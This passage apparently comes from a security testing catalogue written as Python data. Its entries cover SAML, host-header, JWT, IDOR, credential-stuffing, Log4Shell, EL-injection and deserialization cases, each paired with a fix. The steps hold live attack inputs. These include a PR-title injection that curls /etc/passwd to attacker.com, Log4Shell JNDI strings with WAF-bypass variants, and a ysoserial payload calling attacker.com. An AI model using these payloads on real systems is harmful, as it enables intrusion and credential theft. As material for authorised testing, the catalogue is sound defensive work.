        "tools": {}, "applicable_to": ["web", "api", "cloud"], "tags": ["supply-chain", "dependency-confusion"],
    },
    {
        "id": "TC-MW003", "title": "SAML Authentication Bypass",
        "category": "Modern Web Attacks", "severity": "critical",
        "description": "SAML parsing flaws allow signature wrapping, XML comments in NameID, and assertion replay attacks.",
        "attack_pattern": "Manipulate SAML assertion to bypass signature validation.",
        "steps": [
            "Capture a valid SAML response (base64 decode the SAMLResponse parameter)",
            "Test XML signature wrapping: copy signed assertion, add malicious unsigned assertion, wrap original in extensions",
            "Test comment injection in NameID: admin<!----> vs admin (some parsers strip comments)",
            "Test assertion replay: resend same SAMLResponse after it should have expired",
            "Test XXE in SAML XML payload",
        ],
        "expected_result": "Strict schema validation before signature verification. Short assertion lifetime. No XXE.",
        "cwe": "CWE-347", "owasp": "A07:2021",
        "tools": {"nuclei_tags": ["saml", "auth"]},
        "applicable_to": ["web"], "tags": ["saml", "auth", "sso", "critical"],
    },
    {
        "id": "TC-MW004", "title": "Host Header Injection",
        "category": "Modern Web Attacks", "severity": "medium",
        "description": "Applications trusting the Host header for URL generation enable password reset poisoning, cache poisoning, and SSRF.",
        "attack_pattern": "Manipulate Host header and observe if it affects application behavior.",
        "steps": [
            "Add Host: attacker.com and observe if reflected in response or redirects",
            "Test X-Forwarded-Host, X-Host, X-Forwarded-Server as Host override headers",
            "Test password reset: inject attacker host to capture reset tokens (see TC-A004)",
            "Test cache poisoning: if reflected in cached response, poison for all users",
            "Test absolute-URL redirects relying on Host header",
        ],
        "expected_result": "Applications must use a configured base URL. Never trust Host header for sensitive operations.",
        "cwe": "CWE-20", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["host-header", "injection"]},
        "applicable_to": ["web"], "tags": ["host-header", "injection"],
    },

    # ── CRYPTOGRAPHY ──────────────────────────────────────────────────────────
    {
        "id": "TC-CRY001", "title": "Weak / Predictable Tokens",
        "category": "Cryptography", "severity": "high",
        "description": "Predictable password reset tokens, session IDs, or API keys can be brute-forced.",
        "attack_pattern": "Analyze multiple tokens for patterns indicating weak randomness.",
        "steps": [
            "Generate 10+ password reset tokens and compare (look for sequential patterns, timestamps)",
            "Decode tokens: base64, hex — check if they contain timestamps or user IDs",
            "Test short tokens: 6-8 character alphanumeric = 3.5 billion possibilities, feasible brute-force",
            "Use hashcat or custom script to brute-force short tokens",
            "Test session IDs via Burp's Sequencer for randomness quality",
        ],
        "expected_result": "Tokens must use cryptographically secure random (CSPRNG) with at least 128 bits of entropy.",
        "cwe": "CWE-338", "owasp": "A02:2021",
        "tools": {}, "applicable_to": ["web", "api"], "tags": ["crypto", "tokens", "randomness"],
    },
    {
        "id": "TC-CRY002", "title": "Timing Attack on Authentication",
        "category": "Cryptography", "severity": "medium",
        "description": "Non-constant-time string comparison leaks whether a value is partially correct via response time differences.",
        "attack_pattern": "Measure response times for valid vs. invalid inputs across many requests.",
        "steps": [
            "Send 100 requests with invalid API key — measure average response time",
            "Send 100 requests where first N characters match a valid key — compare timing",
            "Statistical analysis: t-test on response times to confirm timing oracle",
            "Applicable to: API key validation, HMAC signature verification, token comparison",
        ],
        "expected_result": "All secret comparisons must use constant-time comparison functions (hmac.compare_digest, crypto.timingSafeEqual).",
        "cwe": "CWE-208", "owasp": "A02:2021",
        "tools": {}, "applicable_to": ["web", "api"], "tags": ["timing", "crypto"],
    },

    # ── SUBDOMAIN TAKEOVER ────────────────────────────────────────────────────
    {
        "id": "TC-T001", "title": "Subdomain Takeover",
        "category": "Infrastructure", "severity": "high",
        "description": "DNS records pointing to deprovisioned cloud services allow attackers to serve content under the victim domain.",
        "attack_pattern": "Identify dangling DNS records pointing to unclaimed services.",
        "steps": [
            "Enumerate all subdomains (TC-R001)",
            "Check CNAME targets for unclaimed services (NXDOMAIN, 404, default page)",
            "Test fingerprints: 'There is no app configured' (Heroku), 'NoSuchBucket' (S3), '404 Not Found' (GitHub Pages)",
            "Claim the service under attacker account",
            "Verify: serve custom content and confirm it loads under victim subdomain",
        ],
        "expected_result": "Remove DNS records pointing to deprovisioned services. Monitor subdomains continuously.",
        "cwe": "CWE-350", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["subdomain-takeover", "dns"]},
        "applicable_to": ["web", "cloud"], "tags": ["subdomain-takeover", "dns"],
    },

    # ── MOBILE ────────────────────────────────────────────────────────────────
    {
        "id": "TC-MOB001", "title": "Insecure Data Storage (Mobile)",
        "category": "Mobile", "severity": "high",
        "description": "Sensitive data stored unencrypted in SharedPreferences, SQLite, or external storage is accessible to other apps or via device backup.",
        "attack_pattern": "Extract and inspect app data storage on a rooted device or via backup.",
        "steps": [
            "Rooted Android: adb shell; cat /data/data/<pkg>/shared_prefs/*.xml",
            "Check SQLite: sqlite3 /data/data/<pkg>/databases/*.db .dump",
            "Check external storage: /sdcard/Android/data/<pkg>/",
            "iOS: use iMazing or Frida to access container directory",
            "Test backup extraction: adb backup -noapk com.<pkg>",
        ],
        "expected_result": "Sensitive data encrypted at rest. No PII or tokens in plaintext storage.",
        "cwe": "CWE-312", "owasp": "M2:2024",
        "tools": {}, "applicable_to": ["mobile"], "tags": ["mobile", "storage", "android", "ios"],
    },
    {
        "id": "TC-MOB002", "title": "Certificate Pinning Bypass (Mobile)",
        "category": "Mobile", "severity": "medium",
        "description": "Certificate pinning prevents MITM interception of app traffic — bypassing it enables API traffic analysis.",
        "attack_pattern": "Use Frida or apk patching to disable certificate pinning.",
        "steps": [
            "Install app, set up Burp proxy — observe if traffic is intercepted or blocked",
            "Use Frida with SSL Kill Switch 2 script: frida --codeshare nabla-c0d3/ssl-kill-switch2 -U -f <bundle>",
            "Alternatively: apktool d app.apk → patch network security config → rebuild",
            "iOS: use ssl-kill-switch2 Cydia package",
            "Once intercepted, analyze API calls for vulnerabilities",
        ],
        "expected_result": "Certificate pinning should be in place. Use multiple pin backups.",
        "cwe": "CWE-295", "owasp": "M5:2024",
        "tools": {}, "applicable_to": ["mobile"], "tags": ["mobile", "ssl", "pinning"],
    },
    {
        "id": "TC-MOB003", "title": "Insecure Deep Link Handling",
        "category": "Mobile", "severity": "medium",
        "description": "Deep links handled without input validation allow CSRF-style attacks and data injection via custom URL schemes.",
        "attack_pattern": "Craft malicious deep links targeting vulnerable URI handlers.",
        "steps": [
            "Enumerate app URI schemes from AndroidManifest.xml or Info.plist",
            "Test: myapp://auth/callback?token=attacker_controlled_value",
            "Test open redirect via deep link: myapp://open?url=https://evil.com",
            "Test CSRF via deep link: myapp://transfer?amount=1000&to=attacker",
            "Test JavaScript injection if app uses WebViews: myapp://page?data=<script>alert(1)</script>",
        ],
        "expected_result": "Validate all deep link parameters. Require user confirmation for sensitive actions.",
        "cwe": "CWE-939", "owasp": "M4:2024",
        "tools": {}, "applicable_to": ["mobile"], "tags": ["mobile", "deep-link"],
    },

    # ── SUPPLY CHAIN ──────────────────────────────────────────────────────────
    {
        "id": "TC-SC001", "title": "CI/CD Pipeline Injection",
        "category": "Supply Chain", "severity": "critical",
        "description": "Unsanitized user input in CI/CD pipeline configurations allows code injection that runs in the build environment with elevated privileges.",
        "attack_pattern": "Inject commands via PR titles, branch names, or environment variables used in pipeline steps.",
        "steps": [
            "Review pipeline config files: .github/workflows/*.yml, .gitlab-ci.yml, Jenkinsfile",
            "Find steps using user-controlled inputs (PR title, branch name, commit message) in shell commands",
            "Test: create PR with title containing: test'; curl https://attacker.com/$(cat /etc/passwd); echo '",
            "Check for exposed secrets in pipeline logs: grep -i 'password\\|secret\\|key' build_log.txt",
            "Test if external PRs can access secrets (should be restricted to internal PRs only)",
        ],
        "expected_result": "Sanitize all user inputs before use in shell commands. Restrict secrets to internal PRs only.",
        "cwe": "CWE-78", "owasp": "A08:2021",
        "tools": {"nuclei_tags": ["cicd", "exposure"]},
        "applicable_to": ["web", "cloud"], "tags": ["cicd", "supply-chain", "rce", "critical"],
    },

    # ── RECONNAISSANCE (additional) ───────────────────────────────────────────
    {
        "id": "TC-R008", "title": "Wayback Machine / Archive Mining",
        "category": "Reconnaissance", "severity": "medium",
        "description": "Web archives (Wayback Machine, CommonCrawl) preserve old pages, exposed secrets, and deprecated API endpoints that may still be functional.",
        "attack_pattern": "Query the Wayback Machine CDX API for historical URLs and inspect captured responses.",
        "steps": [
            "Query CDX API: https://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&collapse=urlkey&fl=original",
            "Filter for interesting paths: .env, .git, /api/v1/, /admin/, /backup/, /config",
            "Download old snapshots and look for API keys, passwords, internal docs",
            "Test if old API endpoints are still live: waybackurls target.com | httpx -silent",
            "Look for deleted JavaScript files that reveal internal API structure",
        ],
        "expected_result": "Secrets must be revoked immediately. Old endpoints decommissioned before public launch.",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["exposure"]},
        "applicable_to": ["web", "api"], "tags": ["recon", "osint", "passive"],
    },
    {
        "id": "TC-R009", "title": "JavaScript File Analysis & Source Map Extraction",
        "category": "Reconnaissance", "severity": "high",
        "description": "Bundled JS files expose internal API endpoints, secrets, and business logic. Source maps reveal original source code in production.",
        "attack_pattern": "Parse JS bundles for endpoints and secrets; download .map files to recover source.",
        "steps": [
            "Find all JS files: wget --spider -r -nd --no-parent -R.png,jpg,css https://target.com 2>&1 | grep .js",
            "Download and analyze: grep -E 'api_key|secret|password|token|_url|/api/' main.*.js",
            "Check for source maps: X-SourceMap header or //# sourceMappingURL= comment in JS",
            "Download .map file: main.js → main.js.map and use unpack-tool to recover source",
            "Use LinkFinder: python3 linkfinder.py -i https://target.com -d to extract endpoints",
            "Check localStorage keys set in JS — reveals expected auth token names",
        ],
        "expected_result": "Source maps must not be deployed to production. No hardcoded secrets in client-side code.",
        "cwe": "CWE-540", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["exposure", "js"]},
        "applicable_to": ["web"], "tags": ["recon", "js", "source-code", "secrets"],
    },
    {
        "id": "TC-R010", "title": "Employee & Email Harvesting (OSINT)",
        "category": "Reconnaissance", "severity": "info",
        "description": "Employee names, emails, and LinkedIn profiles are used for phishing, credential stuffing, and identifying internal tooling.",
        "attack_pattern": "Use public OSINT sources to build an employee directory.",
        "steps": [
            "theHarvester -d target.com -l 500 -b google,linkedin,bing",
            "LinkedIn: search company employees, identify tech stack from job postings",
            "hunter.io / snov.io — verify email format and enumerate real addresses",
            "Search job listings for internal stack: 'We use Kubernetes, AWS EKS, Vault, Datadog'",
            "Cross-reference against breach databases: dehashed, intelx.io for password dumps",
            "Use found emails in credential stuffing against login endpoints",
        ],
        "expected_result": "Email format must not be confirmed externally. Implement MFA to resist credential stuffing.",
        "cwe": "CWE-200", "owasp": None,
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["recon", "osint", "phishing"],
    },
    {
        "id": "TC-R011", "title": "Shodan / Censys Attack Surface Discovery",
        "category": "Reconnaissance", "severity": "high",
        "description": "Search engine indexing of internet-exposed services reveals misconfigured ports, certificates, and banners without active scanning.",
        "attack_pattern": "Query passive scan engines for the target organization.",
        "steps": [
            "Shodan: org:'Target Company' — find all indexed hosts and open ports",
            "Shodan: ssl.cert.subject.cn:target.com — find all certs for the domain",
            "Censys: parsed.subject.common_name:target.com AND protocols:443/https",
            "Identify self-signed certs, unexpected ports, banners revealing software versions",
            "Look for Shodan CVE alerts: vuln:CVE-XXXX-XXXX org:target",
            "Cross-reference findings with active port scan to identify untracked assets",
        ],
        "expected_result": "Only documented assets exposed. All services patched. No unnecessary ports open.",
        "cwe": "CWE-200", "owasp": None,
        "tools": {"nuclei_tags": ["exposure"]},
        "applicable_to": ["web", "network", "cloud"], "tags": ["recon", "passive", "shodan"],
    },
    {
        "id": "TC-R012", "title": "Broken Link / Hijackable Resource Detection",
        "category": "Reconnaissance", "severity": "medium",
        "description": "External JavaScript, CDN resources, or third-party services referenced in HTML can be hijacked if their domain expires or their path is unclaimed.",
        "attack_pattern": "Enumerate all external resources loaded by the app and check for availability.",
        "steps": [
            "Spider the target: hakrawler -url https://target.com -plain | grep 'http://'",
            "Extract all external script/img/link src attributes",
            "For each external domain: check WHOIS for expiry, register expired ones",
            "Test unclaimed CDN paths: cdn.target.com/lib/script.js — does the bucket/path exist?",
            "Check npm/GitHub packages: if package was unpublished, it can be re-published",
            "Test if referenced subdomains have dangling CNAME (subdomain takeover path)",
        ],
        "expected_result": "All external dependencies pinned with SRI. Periodically audit third-party URLs.",
        "cwe": "CWE-829", "owasp": "A06:2021",
        "tools": {},
        "applicable_to": ["web"], "tags": ["recon", "supply-chain", "broken-link"],
    },
    {
        "id": "TC-R013", "title": "Technology Stack Fingerprinting",
        "category": "Reconnaissance", "severity": "info",
        "description": "Identifying the exact technology stack (framework, CMS, database, CDN, WAF) enables targeted exploitation of known CVEs.",
        "attack_pattern": "Passively fingerprint technologies from headers, cookies, and HTML patterns.",
        "steps": [
            "Run Wappalyzer or whatweb: whatweb -a 3 https://target.com",
            "Inspect headers: Server, X-Powered-By, X-Generator, X-AspNet-Version",
            "Inspect cookies: PHPSESSID (PHP), JSESSIONID (Java), _ga (GA), cf_ (Cloudflare)",
            "Inspect HTML: WordPress meta generator, Drupal data-drupal-*, Django CSRF token format",
            "Check error pages for framework information: 404 page, exception pages",
            "Use nuclei: nuclei -u target.com -t technologies/",
        ],
        "expected_result": "Version information stripped from all headers, error pages, and meta tags.",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["tech", "exposure"]},
        "applicable_to": ["web", "api"], "tags": ["recon", "fingerprint"],
    },
    {
        "id": "TC-R014", "title": "S3/GCS/Azure Bucket Name Bruteforce",
        "category": "Reconnaissance", "severity": "high",
        "description": "Cloud storage bucket names are global and predictable — brute-forcing company-named variants reveals public buckets.",
        "attack_pattern": "Generate candidate bucket names from company name and test for accessibility.",
        "steps": [
            "Generate names: target, target-prod, target-dev, target-backup, target-data, target-logs, target-uploads, target-static, target-media, target2024",
            "Test S3: aws s3 ls s3://<candidate> --no-sign-request || curl https://<candidate>.s3.amazonaws.com",
            "Test GCS: curl https://storage.googleapis.com/<candidate>/",
            "Test Azure: curl https://<candidate>.blob.core.windows.net/",
            "Use cloud_enum: python3 cloud_enum.py -k target -m s3 gcs azure",
        ],
        "expected_result": "All buckets private. Block Public Access enabled at org level.",
        "cwe": "CWE-284", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["cloud", "s3", "exposure"]},
        "applicable_to": ["cloud"], "tags": ["recon", "cloud", "s3", "storage"],
    },

    # ── AUTHENTICATION (additional) ───────────────────────────────────────────
    {
        "id": "TC-A007", "title": "Credential Stuffing & Password Spray",
        "category": "Authentication", "severity": "critical",
        "description": "Breached credentials from other sites are reused against target logins. Password spray tests a few common passwords across all accounts.",
        "attack_pattern": "Test breached credential pairs against login with rate-limit evasion.",
        "steps": [
            "Download breach dumps from HaveIBeenPwned or dehashed for target's email domain",
            "Build credential list: target email + breach password",
            "Use ffuf/Hydra with 1-request-per-second rate: hydra -L emails.txt -P passwords.txt https://target.com/login",
            "Test password spray: 100,000 accounts × 3 common passwords (Password1!, Summer2024!, Welcome1!)",
            "Bypass IP rate-limiting: distribute requests across multiple IPs / X-Forwarded-For rotation",
        ],
        "expected_result": "MFA required. CAPTCHA after N failures. Account lockout after 10 attempts. Breached password detection.",
        "cwe": "CWE-307", "owasp": "A07:2021",
        "tools": {"nuclei_tags": ["default-login", "auth"]},
        "applicable_to": ["web", "api"], "tags": ["auth", "brute-force", "credential-stuffing"],
    },
    {
        "id": "TC-A008", "title": "Account Pre-Takeover (Registration Hijacking)",
        "category": "Authentication", "severity": "high",
        "description": "An attacker registers an account with victim's email before the victim does. When victim registers via SSO/OAuth, the attacker's password gets merged, granting access.",
        "attack_pattern": "Pre-register victim's email, then observe if SSO link merges the account.",
        "steps": [
            "Register attacker account with victim@target.com and set password",
            "Have victim register via Google/GitHub OAuth (same email)",
            "Check if OAuth merge grants attacker's password-based login access to victim's account",
            "Test reverse: register via OAuth first, then regular registration with same email",
            "Test unverified email: can attacker register email, victim clicks confirmation link, and attacker retains access?",
        ],
        "expected_result": "Verify email ownership before linking. Require re-authentication to merge accounts.",
        "cwe": "CWE-287", "owasp": "A07:2021",
        "tools": {},
        "applicable_to": ["web"], "tags": ["auth", "ato", "pre-takeover", "account-takeover"],
    },
    {
        "id": "TC-A009", "title": "Password Change Without Current Password",
        "category": "Authentication", "severity": "high",
        "description": "Password change flows that don't verify the current password allow account takeover if session is hijacked.",
        "attack_pattern": "Remove or bypass the current_password field in password change requests.",
        "steps": [
            "Intercept password change request — observe fields: old_password, new_password, confirm",
            "Remove old_password field from request — check if accepted",
            "Send blank old_password — check if accepted",
            "Test via API: PATCH /api/user/password with only new_password",
            "Test CSRF: can attacker trigger password change cross-site without current password?",
        ],
        "expected_result": "Current password must be verified server-side before any password change.",
        "cwe": "CWE-620", "owasp": "A07:2021",
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["auth", "password-change"],
    },
    {
        "id": "TC-A010", "title": "Account Lockout & Brute-Force Protection",
        "category": "Authentication", "severity": "medium",
        "description": "No account lockout or ineffective lockout allows unlimited password brute-forcing.",
        "attack_pattern": "Send rapid login attempts and observe if protection engages.",
        "steps": [
            "Send 50 invalid login attempts — check if account locks, CAPTCHA appears, or IP blocks",
            "Test lockout bypass: vary User-Agent, X-Forwarded-For, True-Client-IP headers",
            "Test if lockout applies per-IP only (bypass by rotating IPs) vs per-account (correct)",
            "Test distributed spray: 1 attempt per account avoids per-account lockout",
            "Check if lock message reveals account existence (enumeration)",
        ],
        "expected_result": "Account lockout after 5-10 failures. Progressive delays. Lockout per username not IP.",
        "cwe": "CWE-307", "owasp": "A07:2021",
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["auth", "brute-force", "lockout"],
    },
    {
        "id": "TC-A011", "title": "OAuth Code/Token Interception via Referrer",
        "category": "Authentication", "severity": "high",
        "description": "OAuth authorization codes in URLs leak to external sites via the Referer header on pages with embedded third-party content.",
        "attack_pattern": "Monitor Referer headers after OAuth redirects with embedded images or scripts.",
        "steps": [
            "Initiate OAuth flow and complete authorization",
            "Observe the redirect URL: contains ?code= or #access_token=",
            "Check if the callback page loads any third-party resources (images, analytics, scripts)",
            "Third-party domains receive the Referer header containing the code/token",
            "Test: add Referrer-Policy header response — it should be strict-origin-when-cross-origin",
            "Test implicit flow: access_token in URL fragment leaks via same mechanism",
        ],
        "expected_result": "Use authorization code flow with PKCE. Callback pages must not load third-party resources. Set Referrer-Policy: no-referrer.",
        "cwe": "CWE-598", "owasp": "A07:2021",
        "tools": {},
        "applicable_to": ["web"], "tags": ["auth", "oauth", "token-leak"],
    },
    {
        "id": "TC-A012", "title": "API Key Authentication Issues",
        "category": "Authentication", "severity": "high",
        "description": "API keys exposed in URLs, logs, or client-side code, or lacking proper scope restrictions, enable unauthorized API access.",
        "attack_pattern": "Find API keys via reconnaissance and test their scope and revocation.",
        "steps": [
            "Search JS files and repos for: api_key=, apiKey:, X-API-Key, Authorization: Bearer",
            "Test if API keys appear in query parameters (logged in server access logs): ?api_key=<value>",
            "Test API key scope: can a low-privilege key call admin endpoints?",
            "Test key rotation: after rotating, does the old key still work?",
            "Test key sharing: is the same key used across multiple environments (dev/prod)?",
        ],
        "expected_result": "API keys in headers only. Scoped to minimum required permissions. Rotatable. Not in URLs.",
        "cwe": "CWE-522", "owasp": "A07:2021",
        "tools": {"nuclei_tags": ["exposure", "token"]},
        "applicable_to": ["api"], "tags": ["auth", "api-key", "secrets"],
    },
    {
        "id": "TC-A013", "title": "SSO / SAML Response Manipulation",
        "category": "Authentication", "severity": "critical",
        "description": "SP-initiated SSO flows that don't validate the InResponseTo attribute allow IdP-initiated unsolicited responses and privilege escalation.",
        "attack_pattern": "Submit modified SAML assertions without a valid AuthnRequest pairing.",
        "steps": [
            "Complete SSO flow and capture the SAMLResponse POST",
            "Decode (base64) and modify: change NameID to admin, change Role attribute",
            "Re-sign with weak/no key if signature validation is absent",
            "Test IdP-initiated: submit a crafted SAMLResponse without starting an SP-initiated flow",
            "Test: replay a valid SAMLResponse after logout — is it accepted again?",
        ],
        "expected_result": "Validate InResponseTo. Verify signature before processing attributes. Short NotOnOrAfter (≤5 min). One-time use assertions.",
        "cwe": "CWE-287", "owasp": "A07:2021",
        "tools": {"nuclei_tags": ["saml", "auth"]},
        "applicable_to": ["web"], "tags": ["auth", "sso", "saml", "critical"],
    },

    # ── AUTHORIZATION ─────────────────────────────────────────────────────────
    {
        "id": "TC-AZ001", "title": "Horizontal Privilege Escalation",
        "category": "Authorization", "severity": "high",
        "description": "Same-role users accessing each other's data. The most common bug bounty finding — manipulate IDs to access peer resources.",
        "attack_pattern": "Use one account's token to access another account's resources by ID.",
        "steps": [
            "Create two test accounts (A and B) with the same role",
            "As account A, enumerate resource IDs (orders, files, messages, reports)",
            "Switch to account B's token, access account A's resources by their IDs",
            "Test all endpoints: GET /api/invoices/123, DELETE /api/messages/456",
            "Test non-obvious ID types: UUIDs, hashes, slugs",
            "Test indirect references: ?filename=report.pdf, ?export=user_a_data",
        ],
        "expected_result": "Server verifies resource ownership on every request regardless of ID format.",
        "cwe": "CWE-639", "owasp": "A01:2021",
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["authorization", "idor", "horizontal-priv"],
    },
    {
        "id": "TC-AZ002", "title": "Vertical Privilege Escalation",
        "category": "Authorization", "severity": "critical",
        "description": "Low-privilege users accessing or modifying high-privilege functionality by directly calling privileged endpoints.",
        "attack_pattern": "Authenticate as a regular user and invoke admin/privileged API endpoints.",
        "steps": [
            "Identify admin endpoints from JS source, swagger docs, or observed admin traffic",
            "Test each admin endpoint with regular user's authentication token",
            "Test: POST /api/admin/users, DELETE /api/admin/users/all, GET /api/admin/config",
            "Test role elevation: PATCH /api/users/me with {\"role\": \"admin\"} or {\"is_admin\": true}",
            "Test parameter-based auth bypass: ?admin=true, ?debug=true appended to any endpoint",
            "Test header-based bypass: X-User-Role: admin, X-Admin: true",
        ],
        "expected_result": "All privileged endpoints enforce server-side role checks regardless of request parameters.",
        "cwe": "CWE-269", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["exposure", "api"]},
        "applicable_to": ["web", "api"], "tags": ["authorization", "privilege-escalation", "critical"],
    },
    {
        "id": "TC-AZ003", "title": "Tenant / Organization Isolation Bypass (Multi-Tenant)",
        "category": "Authorization", "severity": "critical",
        "description": "SaaS applications must strictly isolate data between tenants. Cross-tenant access is a critical severity finding in any multi-tenant product.",
        "attack_pattern": "Switch tenant context or manipulate org_id to access another tenant's data.",
        "steps": [
            "Identify the org/tenant identifier in requests: org_id, workspace_id, account_id",
            "Register two separate organizations (Org A and Org B)",
            "Using Org B credentials, substitute Org A's IDs in all API requests",
            "Test: GET /api/orgs/{org_a_id}/users with Org B token",
            "Test if org_id can be changed in JWT claims or session data",
            "Test file/asset sharing: can Org B access files uploaded by Org A?",
        ],
        "expected_result": "All queries must be scoped to the authenticated user's tenant. Never trust client-provided tenant IDs.",
        "cwe": "CWE-863", "owasp": "A01:2021",
        "tools": {},
        "applicable_to": ["web", "api", "cloud"], "tags": ["authorization", "multi-tenant", "critical", "saas"],
    },
    {
        "id": "TC-AZ004", "title": "JWT Claim Manipulation",
        "category": "Authorization", "severity": "high",
        "description": "JWT tokens used for authorization can have claims modified if signature verification is absent, weak, or bypassable.",
        "attack_pattern": "Modify JWT payload claims and test if server accepts the tampered token.",
        "steps": [
            "Decode JWT (base64url): echo '<header.payload>' | base64 -d",
            "Modify payload: change user_id, role, org_id, permissions array",
            "Re-encode without re-signing — test if server validates signature",
            "Set alg to 'none': {\"alg\":\"none\"} and remove signature",
            "Set alg to HS256, sign with empty string or 'secret' as HMAC key",
            "Test kid header injection: {\"kid\": \"../../dev/null\"} to use empty secret",
        ],
        "expected_result": "Signature must be cryptographically verified. alg=none rejected. Strong asymmetric keys preferred.",
        "cwe": "CWE-347", "owasp": "A02:2021",
        "tools": {"nuclei_tags": ["jwt", "auth"]},
        "applicable_to": ["web", "api"], "tags": ["authorization", "jwt", "token"],
    },
    {
        "id": "TC-AZ005", "title": "GraphQL Authorization — Field & Object Level",
        "category": "Authorization", "severity": "high",
        "description": "GraphQL resolvers often implement authorization inconsistently across field and object levels, allowing access to sensitive data via nested queries.",
        "attack_pattern": "Query sensitive fields via nested relationships to bypass top-level authorization.",
        "steps": [
            "Query normally restricted data through a nested relationship: { order(id:1) { user { email, password_hash } } }",
            "Test alias bypass: { a: adminSettings { secretKey } }",
            "Test mutations with unauthorized object IDs: mutation { deleteUser(id: other_user_id) }",
            "Test subscription authorization: do subscriptions enforce the same rules as queries?",
            "Test argument injection: { users(role: \"admin\") { id } }",
        ],
        "expected_result": "Authorization enforced at resolver level for every field and object, not just the entry point.",
        "cwe": "CWE-285", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["graphql"]},
        "applicable_to": ["api"], "tags": ["graphql", "authorization", "api"],
    },
    {
        "id": "TC-AZ006", "title": "IDOR via Batch / Bulk Endpoints",
        "category": "Authorization", "severity": "high",
        "description": "Bulk API endpoints (delete many, export multiple) often skip per-object authorization checks, allowing access to arbitrary IDs in a single request.",
        "attack_pattern": "Submit batch requests mixing own IDs with other users' IDs.",
        "steps": [
            "Find batch endpoints: POST /api/messages/bulk-delete, POST /api/export, GET /api/users?ids=",
            "Submit a batch containing both own IDs and other user IDs: {\"ids\": [own_id, victim_id]}",
            "Check if all IDs are processed or only owned ones",
            "Test bulk update: PATCH /api/orders with array of order objects including victim's orders",
            "Test export: GET /api/export?user_ids=1,2,3,victim_id",
        ],
        "expected_result": "Each ID in a batch request must be individually authorization-checked before processing.",
        "cwe": "CWE-639", "owasp": "A01:2021",
        "tools": {},
        "applicable_to": ["api", "web"], "tags": ["authorization", "idor", "batch"],
    },

    # ── INJECTION (additional) ────────────────────────────────────────────────
    {
        "id": "TC-INJ007", "title": "XPath Injection",
        "category": "Advanced Injection", "severity": "high",
        "description": "XPath queries constructed from user input allow authentication bypass and data extraction from XML stores.",
        "attack_pattern": "Inject XPath metacharacters to modify query logic.",
        "steps": [
            "Test login: ' or '1'='1 in username field with any password",
            "Test: admin' or '1'='1 — bypasses WHERE clause in XPath query",
            "Blind extraction: use and contains(//user[1]/password,'a') to test characters",
            "Test in XML-based backends and LDAP/AD authentication",
        ],
        "expected_result": "Use parameterized XPath APIs. Validate and escape all user input before XPath construction.",
        "cwe": "CWE-643", "owasp": "A03:2021",
        "tools": {},
        "applicable_to": ["web", "api"], "tags": ["xpath", "injection"],
    },
    {
        "id": "TC-INJ008", "title": "Expression Language / EL Injection",
        "category": "Advanced Injection", "severity": "critical",
        "description": "Java EL, Spring SpEL, and Thymeleaf template engines process injected expressions as server-side code, enabling RCE.",
        "attack_pattern": "Inject EL expressions into user-controlled inputs rendered by Java web frameworks.",
        "steps": [
            "Test: ${7*7} — if 49 appears in response, EL injection confirmed",
            "Test Spring SpEL: #{7*7}, T(java.lang.Runtime).getRuntime().exec('id')",
            "Test Thymeleaf: __${7*7}__, [[${7*7}]]",
            "Test in error messages: invalid field name with ${} causing EL evaluation",
            "Escalate to RCE: T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id'})",
        ],
        "expected_result": "User input must never be passed to EL interpreters. Use logic-less templates.",
        "cwe": "CWE-917", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["ssti", "rce"]},
        "applicable_to": ["web", "api"], "tags": ["el-injection", "rce", "java", "critical"],
    },
    {
        "id": "TC-INJ009", "title": "Log4Shell / Log Injection (Log4j)",
        "category": "Advanced Injection", "severity": "critical",
        "description": "Log4j JNDI lookup injection (CVE-2021-44228) via any logged user-controlled value triggers outbound DNS/LDAP and enables RCE.",
        "attack_pattern": "Inject ${jndi:ldap://attacker.com/x} into any logged input field.",
        "steps": [
            "Inject into all user-controlled inputs: ${jndi:ldap://attacker.burpcollaborator.net/x}",
            "Test headers: User-Agent, X-Forwarded-For, X-Api-Version, Authorization, Referer",
            "Test form fields, API parameters, XML elements, JSON values",
            "Monitor DNS/HTTP for callbacks from the target server",
            "Variants: ${${lower:j}ndi:ldap://}, ${${::-j}${::-n}${::-d}${::-i}:ldap://} (WAF bypass)",
            "Also test Log4j2 2.15.x bypass: ${jndi:ldap://127.0.0.1#attacker.com/x}",
        ],
        "expected_result": "Log4j must be ≥2.17.1. JNDI lookups disabled in all logging libraries.",
        "cwe": "CWE-917", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["log4j", "cve", "rce"]},
        "applicable_to": ["web", "api", "network"], "tags": ["log4shell", "rce", "critical", "cve"],
    },
    {
        "id": "TC-INJ010", "title": "Deserialization RCE (Java — Apache Commons)",
        "category": "Deserialization", "severity": "critical",
        "description": "Java applications deserializing untrusted objects via native Java serialization are vulnerable to gadget-chain RCE via Apache Commons Collections and similar libraries.",
        "attack_pattern": "Send crafted serialized Java objects via HTTP endpoints accepting binary data.",
        "steps": [
            "Identify endpoints accepting Java serialized objects: Content-Type: application/x-java-serialized-object, or data starting with 0xaced",
            "Check for RMI/JMX/JNDI endpoints: nmap -p 1099,1098,4447 target",
            "Use ysoserial to generate payloads: java -jar ysoserial.jar CommonsCollections6 'curl attacker.com' > payload.ser",
            "Submit payload to deserialization endpoints",
            "Test ViewState (ASP.NET): if MAC validation disabled, modify ViewState for code execution",
        ],
        "expected_result": "Avoid native Java deserialization of untrusted data. Use SerialKiller allowlist filter. Update all dependencies.",
        "cwe": "CWE-502", "owasp": "A08:2021",
        "tools": {"nuclei_tags": ["deserialization", "rce"]},
        "applicable_to": ["web", "api", "network"], "tags": ["deserialization", "rce", "java", "critical"],
    },
    {
        "id": "TC-INJ011", "title": "PHP Object Injection via Unserialize()",
        "category": "Deserialization", "severity": "critical",
